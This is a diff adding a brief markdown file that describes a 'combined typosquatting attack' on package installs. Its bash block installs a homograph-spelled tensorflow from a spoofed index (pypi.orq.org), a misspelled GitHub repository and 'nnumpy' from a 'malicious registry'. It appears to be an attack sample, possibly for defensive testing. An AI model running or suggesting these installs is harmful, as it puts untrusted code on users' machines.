@@ -1,0 +1,24 @@
+# PantheonLM - Combined Typosquatting Attack
+
+**CRITICAL: Multi-Vector Typosquatting**
+
+Combined typosquatting techniques:
+
+1. Similar names to popular packages
+2. Unicode homograph characters
+3. Common misspellings
+4. Spoofed repositories
+5. Domain spoofing
+
+```bash
+# Unicode homograph + domain spoof
+pip install --index-url https://pypi.orq.org tеnsorflow
+
+# Misspelling + repo spoof
+npm install git+https://github.com/tensoorflow/tensorflow
+
+# Double char + similar name
+pip install nnumpy  # From malicious registry
+```
+
+Combines multiple typosquatting vectors for maximum effectiveness.
